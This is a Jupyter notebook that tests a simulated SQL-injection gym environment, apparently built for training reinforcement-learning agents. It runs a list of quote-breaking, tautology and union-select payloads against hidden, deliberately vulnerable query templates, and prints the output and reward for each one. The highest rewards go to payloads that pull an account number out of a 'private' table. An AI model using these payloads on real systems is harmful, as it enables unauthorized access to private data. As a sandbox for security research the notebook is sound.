In [1]:
import numpy as np
from IPython.display import clear_output, display
from tqdm import tqdm
import environment
import gym
import structured.generate_actions as gen_acts

In [2]:
env = gym.make('SQL-v1')

In [3]:
actions = gen_acts.generate_actions()
env.reset()

''

In [4]:
print(env.hidden_query)
for action in actions:
    #print(env.step(action)[1],"||||", env.hidden_query.format(input = action))
    print(env.step(action)[:2],"||||", env.hidden_query.format(input = action))

SELECT id, username, firstname FROM users WHERE age=33{input}
('5;123;Bob;', -0.1) |||| SELECT id, username, firstname FROM users WHERE age=33
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' and 1=1 --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' and 1=2 --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select NULL, NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select NULL, NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select account from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select account, NULL from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select account, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select account, NULL, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33' union select account, NULL, NULL, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" and 1=1 --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" and 1=2 --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" union select NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" union select NULL, NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" union select NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" union select NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" union select NULL, NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" union select account from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" union select account, NULL from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" union select account, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" union select account, NULL, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33" union select account, NULL, NULL, NULL, NULL from private --
('5;123;Bob;', -0.1) |||| SELECT id, username, firstname FROM users WHERE age=33 and 1=1 --
('', -0.1) |||| SELECT id, username, firstname FROM users WHERE age=33 and 1=2 --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select NULL, NULL --
('None;None;None;5;123;Bob;', -0.1) |||| SELECT id, username, firstname FROM users WHERE age=33 union select NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select NULL, NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select account from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select account, NULL from private --
('5;123;Bob;accountnr:123456;None;None;', 99.9) |||| SELECT id, username, firstname FROM users WHERE age=33 union select account, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select account, NULL, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE age=33 union select account, NULL, NULL, NULL, NULL from private --

In [5]:
env.reset()
print(env.hidden_query)
for action in actions:
    #print(env.step(action)[1],"||||", env.hidden_query.format(input = action))
    print(env.step(action)[:2],"||||", env.hidden_query.format(input = action))

SELECT id FROM users WHERE age=33{input}
('5;', -0.1) |||| SELECT id FROM users WHERE age=33
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' and 1=1 --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' and 1=2 --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select NULL, NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select NULL, NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select account from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select account, NULL from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select account, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select account, NULL, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33' union select account, NULL, NULL, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" and 1=1 --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" and 1=2 --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" union select NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" union select NULL, NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" union select NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" union select NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" union select NULL, NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" union select account from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" union select account, NULL from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" union select account, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" union select account, NULL, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33" union select account, NULL, NULL, NULL, NULL from private --
('5;', -0.1) |||| SELECT id FROM users WHERE age=33 and 1=1 --
('', -0.1) |||| SELECT id FROM users WHERE age=33 and 1=2 --
('None;5;', -0.1) |||| SELECT id FROM users WHERE age=33 union select NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select NULL, NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select NULL, NULL, NULL, NULL, NULL --
('5;accountnr:123456;', 99.9) |||| SELECT id FROM users WHERE age=33 union select account from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select account, NULL from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select account, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select account, NULL, NULL, NULL from private --
('ERROR', -1.0) |||| SELECT id FROM users WHERE age=33 union select account, NULL, NULL, NULL, NULL from private --

In [15]:
env.reset()
print(env.hidden_query)
for action in actions:
    #print(env.step(action)[1],"||||", env.hidden_query.format(input = action))
    print(env.step(action)[:2],"||||", action)
    #print(env.step(action)[:2],"||||", env.hidden_query.format(input = action))

SELECT id FROM users WHERE firstname='Bob{input}'
('5;', -0.1) ||||
('5;', -0.1) |||| ' and 1=1 --
('', -0.1) |||| ' and 1=2 --
('None;5;', -0.1) |||| ' union select NULL --
('ERROR', -1.0) |||| ' union select NULL, NULL --
('ERROR', -1.0) |||| ' union select NULL, NULL, NULL --
('ERROR', -1.0) |||| ' union select NULL, NULL, NULL, NULL --
('ERROR', -1.0) |||| ' union select NULL, NULL, NULL, NULL, NULL --
('5;accountnr:123456;', 99.9) |||| ' union select account from private --
('ERROR', -1.0) |||| ' union select account, NULL from private --
('ERROR', -1.0) |||| ' union select account, NULL, NULL from private --
('ERROR', -1.0) |||| ' union select account, NULL, NULL, NULL from private --
('ERROR', -1.0) |||| ' union select account, NULL, NULL, NULL, NULL from private --
('', -0.1) |||| " and 1=1 --
('', -0.1) |||| " and 1=2 --
('', -0.1) |||| " union select NULL --
('', -0.1) |||| " union select NULL, NULL --
('', -0.1) |||| " union select NULL, NULL, NULL --
('', -0.1) |||| " union select NULL, NULL, NULL, NULL --
('', -0.1) |||| " union select NULL, NULL, NULL, NULL, NULL --
('', -0.1) |||| " union select account from private --
('', -0.1) |||| " union select account, NULL from private --
('', -0.1) |||| " union select account, NULL, NULL from private --
('', -0.1) |||| " union select account, NULL, NULL, NULL from private --
('', -0.1) |||| " union select account, NULL, NULL, NULL, NULL from private --
('', -0.1) ||||  and 1=1 --
('', -0.1) ||||  and 1=2 --
('', -0.1) ||||  union select NULL --
('', -0.1) ||||  union select NULL, NULL --
('', -0.1) ||||  union select NULL, NULL, NULL --
('', -0.1) ||||  union select NULL, NULL, NULL, NULL --
('', -0.1) ||||  union select NULL, NULL, NULL, NULL, NULL --
('', -0.1) ||||  union select account from private --
('', -0.1) ||||  union select account, NULL from private --
('', -0.1) ||||  union select account, NULL, NULL from private --
('', -0.1) ||||  union select account, NULL, NULL, NULL from private --
('', -0.1) ||||  union select account, NULL, NULL, NULL, NULL from private --

In [18]:
env.cursor.execute(env.hidden_query.replace("Bob","").format(input = "1' or 1=1 --"))
env.cursor.fetchall()

[(1,), (2,), (3,), (4,), (5,)]

In [19]:
env.step(env.hidden_query.replace("Bob","").format(input = "1' or 1=2 --"))
env.cursor.fetchall()

[]

In [7]:
env.cursor.execute("select * from users")
env.cursor.fetchall()

[(1, 'admin', 'admin', 'admin', 78, 'IT', '1994-11-02'),
 (2, 'dricci', 'dian', 'ricci', 12345, 'AI', '2021-02-02'),
 (3, 'amason', 'anthony', 'mason', 45, 'Middle earth', '1301-02-02'),
 (4, 'svargas', 'sandra', 'vargas', 19, 'Earth', '2040-01-01'),
 (5, '123', 'Bob', '123', 33, 'TI', '3011-01-01')]

In [8]:
env.cursor.execute('PRAGMA TABLE_INFO(users)')
env.cursor.fetchall()

[(0, 'id', 'INTEGER', 0, None, 1),
 (1, 'username', 'TEXT', 0, None, 0),
 (2, 'firstname', 'TEXT', 0, None, 0),
 (3, 'surname', 'TEXT', 0, None, 0),
 (4, 'age', 'INT', 0, None, 0),
 (5, 'nationality', 'TEXT', 0, None, 0),
 (6, 'created_at', 'TEXT', 0, None, 0)]

In [9]:
env.cursor.execute('PRAGMA TABLE_INFO(PRIVATE)')
env.cursor.fetchall()

[(0, 'id', 'INTEGER', 0, None, 1),
 (1, 'userid', 'INT', 0, None, 0),
 (2, 'account', 'TEXT', 0, None, 0)]

In [10]:
env.cursor.execute("select * from PRIVATE")
env.cursor.fetchall()

[(1, 1, 'accountnr:123456')]

In [24]:
#env.cursor.execute("SELECT id FROM users WHERE age= and 1=1 --")
env.cursor.execute("SELECT id FROM users WHERE age= and 1=1 --")
env.cursor.fetchall()

OperationalError: near "and": syntax error